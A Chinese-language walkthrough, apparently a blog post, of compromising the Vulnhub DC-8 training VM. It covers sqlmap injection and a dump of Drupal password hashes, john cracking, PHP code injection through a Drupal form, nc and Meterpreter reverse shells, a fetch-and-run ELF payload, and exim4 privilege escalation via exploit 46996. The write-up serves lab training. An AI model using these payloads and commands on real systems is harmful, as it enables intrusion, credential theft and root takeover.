@@ -1,0 +1,319 @@
+# (Vulnhub练习)-- DC: 8渗透实战
+
+![image-20211030141151975](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301411309.png)
+
+
+
+## 下载地址
+
+````
+https://www.vulnhub.com/entry/dc-8,367/
+````
+
+## 扫描主机
+
+```
+netdiscover -i eth0 -r 192.168.100.0/24
+```
+
+## 目标主机IP：192.168.100.160
+
+## 信息收集
+
+>  信息收集的步骤基本上差不多,可根据工具简单写个shell脚本
+
+```sh
+#!/usr/bin/bash
+
+ip=192.168.100.$1
+
+ping -c2 $ip &>/dev/null  
+if [ $? -eq 0 ] ; then 
+		echo "$ip is up"
+	else 
+			echo "$ip is down"
+			    exit
+fi
+
+masscan --rate=10000 --ports 0-65535 $ip 
+masscan --rate=10000 --ports 0-65535 $ip 
+nmap -A $ip
+sleep 30
+whatweb $ip 
+sleep 10
+dirsearch  -u  $ip 
+sleep 5
+nikto -h $ip 
+sleep 5
+dirb http://$ip 
+```
+
+> 我的网段在192.168.100.0/24  所以**ip**要改改
+
+```
+ /home/xiaoxiaoran/shell/xinxi.sh 160
+```
+
+### nmap端口扫描
+
+![image-20211030142559271](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301425399.png)
+
+### 指纹识别
+
+![image-20211030142612183](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301426274.png)
+
+### 路径扫描
+
+![image-20211030142627518](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301426623.png)
+
+![image-20211030142657654](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301426750.png)
+
+![image-20211030142712686](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301427796.png)
+
+## 开始测试
+
+### 对22端口进行弱密码扫描
+
+![image-20211030142841645](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301428747.png)
+
+> 测试失败
+
+### 通过验证，此处url可能含有sql注入漏洞
+
+![image-20211030143923209](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301439313.png)
+
+> url分别为
+
+```
+http://192.168.100.160/?nid=1
+http://192.168.100.160/?nid=2
+http://192.168.100.160/?nid=3
+```
+
+### sqlmap自动化执行
+
+````
+sqlmap -u http://192.168.100.160/?nid=2 
+sqlmap -u http://192.168.100.160/?nid=2  --current-db
+sqlmap -u http://192.168.100.160/?nid=2  -D d7db --tables
+sqlmap -u http://192.168.100.160/?nid=2  -D d7db -T users --columns
+sqlmap -u http://192.168.100.160/?nid=2  -D d7db -T users -C name,pass --dump
+````
+
+![image-20211030143606721](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301436831.png)
+
+```
+admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z 
+john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF 
+```
+
+### john 破解密码
+
+![image-20211030151751903](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301517131.png)
+
+````
+得到   john turtle
+````
+
+## 该网页由前面目录扫描得到,在此尝试登录
+
+> http://192.168.100.160/user
+
+![image-20211030160408190](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301604302.png)
+
+## 漏洞利用原理
+
+### 找到可以编辑php代码的地方
+
+![image-20211030160442407](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301604538.png)
+
+![image-20211030160529070](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301605209.png)
+
+![image-20211030160554351](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301605486.png)
+
+> 在改写 **Confirmation message** 信息后,设置成**Text format**-->php 
+
+> 必须要多些个<p>标签,不然无法调用
+
+
+
+![image-20211030160704319](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301607472.png)
+
+> 在这里提交后会自动调用上面保存的代码
+
+## nc反弹shell
+
+### 代码
+
+````php+HTML
+<p>flag</p>
+<?php system("nc -e /bin/bash 192.168.100.143 1234");?>
+````
+
+```
+nc -nvlp 1234
+```
+
+### 效果
+
+![image-20211030160129249](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301601437.png)
+
+## msf php反弹shell
+
+- msfvenom生成木马
+
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=8080
+```
+
+![image-20211030162357024](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301623210.png)
+
+**php.rc文件**
+
+```
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 192.168.100.143
+set LPORT 8080
+exploit
+```
+
+- 开启监听
+
+```sh
+ msfconsole  -qr /home/xiaoxiaoran/shell/php.rc       
+```
+
+- 把生成的文件复制
+
+![image-20211030162657767](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301626949.png)
+
+```
+<p>flag</p>
+/*<?php /**/ error_reporting(0); $ip = '192.168.100.143'; $port = 8080; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();          
+```
+
+- 效果
+
+![image-20211030161729943](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301617119.png)
+
+## msf linux反弹shell
+
+- msfvenom生成木马
+
+```
+msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
+```
+
+**linux.rc文件**
+
+```sh
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.100.143
+set LPORT 4444
+exploit
+```
+
+- 开启监听
+
+```sh
+msfconsole  -qr /home/xiaoxiaoran/shell/linux.rc  
+```
+
+- 改php代码
+
+![image-20211030163212733](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301632920.png)
+
+```
+<p>flag</p>
+<?php system("wget 192.168.100.143/xiao3 -O /tmp/xiao3;cd /tmp;chmod +x xiao3;./xiao3 &")?>
+```
+
+- 效果
+
+![image-20211030163256139](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301632331.png)
+
+##  提权
+
+### 拿到shell，并用python打开一个标准shell
+
+```python
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+##### find 命令查找具有sudo权限的命令，发现exim4在使用时具有root权限
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+![image-20211030164203144](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301642374.png)
+
+##### 查看命令exim4命令版本
+
+```
+exim4 --version
+```
+
+![image-20211030164308032](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301643234.png)
+
+##### 利用serachsploit查找exim命令的漏洞
+
+````
+searchsploit exim 4.8 
+````
+
+![image-20211030164509483](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301645729.png)
+
+##### 进行查看用法，发现有两个使用方法
+
+```
+cat /usr/share/exploitdb/exploits/linux/local/46996.sh
+```
+
+![image-20211030164747075](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301647280.png)
+
+
+
+#####将文件复制到www目录
+
+```
+cp /usr/share/exploitdb/exploits/linux/local/46996.sh  /var/www/html/46996.sh
+```
+
+##### 将46996.sh下载到靶机
+
+````
+wget http://192.168.100.143/46996.sh
+````
+
+```
+chmod +x 46996.sh
+./46996.sh -m netcat
+```
+
+![image-20211030165802748](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301658919.png)
+
+原因：这个报错是由于windows系统下编辑然后上传到linux系统执行导致的
+解决方案：本地编辑查看文件类型：set ff=unix
+
+![image-20211030165255544](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301652747.png)
+
+
+
+##### 然后我们再重新进行上传
+
+```
+chmod +x 46996.sh
+./46996.sh -m netcat
+```
+
+![image-20211030165920167](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301659392.png)
+
+##### 查看flag
+
+![image-20211030170123794](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301701994.png)
+
+![image-20211030170153590](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202110301701879.png)
+
